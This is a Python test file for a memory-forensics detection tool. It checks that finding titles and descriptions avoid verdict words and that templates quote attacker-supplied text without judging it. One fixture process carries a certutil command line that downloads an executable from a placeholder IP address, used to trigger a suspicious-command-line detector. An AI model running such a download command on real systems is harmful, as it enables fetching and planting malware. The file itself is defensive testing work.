# ruff: noqa: E501 - test data tables (long literal command lines, paths and regions)
"""Findings describe observations, never verdicts (M2 / M3 rule, plan phase 3), and never call
a region "injected code" (RT21): checked on every template and on every finding, IOC context
and timeline title the scenario set produces."""

import re
import string

import pytest
from cyberlab_jobs.memory import MemoryProfile

from dataset.baselines import WIN, Draft
from dataset.scenarios import LIMITS, SCENARIOS, build
from memory_worker import detections
from memory_worker.detections.base import METHOD_MAX, TEMPLATES

VERDICT = re.compile(
    r"\b(?:malicious|malware|infected|infection|compromised?|attacker|evil|backdoor|trojan|"
    r"virus|rootkit|hacked|exploit(?:ed)?|threat actor|ransomware|confirmed)\b|inject",
    re.I,
)


@pytest.mark.parametrize("kind", sorted(TEMPLATES))
def test_templates_never_use_verdict_words(kind: str) -> None:
    method, title, description = TEMPLATES[kind]
    assert not VERDICT.search(title), kind
    assert not VERDICT.search(description), kind
    assert method in METHOD_MAX
    assert re.fullmatch(r"heuristic:mem_[a-z_]+@1", method)


@pytest.mark.parametrize("kind", sorted(TEMPLATES))
def test_template_placeholders_are_plain_names(kind: str) -> None:
    """Values go into named placeholders only: no attribute access or indexing on
    attacker-controlled values, no positional fields."""
    _, title, description = TEMPLATES[kind]
    for template in (title, description):
        for _, name, spec, conversion in string.Formatter().parse(template):
            if name is None:
                continue
            assert re.fullmatch(r"[a-z_]+", name), (kind, name)
            assert not spec and conversion is None, (kind, name)


def test_scenario_output_never_uses_verdict_words() -> None:
    for name in SCENARIOS:
        out = detections.run(build(name), LIMITS)
        for finding in out.findings:
            assert not VERDICT.search(finding.title), (name, finding.title)
            assert not VERDICT.search(finding.description), (name, finding.description)
            assert finding.type in TEMPLATES
        for event in out.timeline:
            if event.event == "finding":
                assert not VERDICT.search(event.title), (name, event.title)


def test_attacker_text_is_quoted_not_judged() -> None:
    """A verdict word inside an image value (a process name) appears only as quoted data:
    the template around it stays neutral."""
    d = Draft(
        os="windows",
        profile=MemoryProfile.TRIAGE,
        image={"kind": "image", "size_bytes": 1, "sha256": "0" * 64, "layer": "L", "arch": "x64"},
    )
    d.add_process(4, 0, "System", None, 0, cmdline="")
    d.add_process(7000, 4, "evil.exe", WIN + "evil.exe", 1, cmdline="certutil -urlcache -f http://198.51.100.1/malware.exe m.exe")
    out = detections.run(d.view(), LIMITS)
    finding = next(f for f in out.findings if f.type == "mem_suspicious_cmdline")
    template = TEMPLATES["mem_suspicious_cmdline"][2]
    assert not VERDICT.search(template)
    assert "malware.exe" in finding.description  # the quoted command line, verbatim
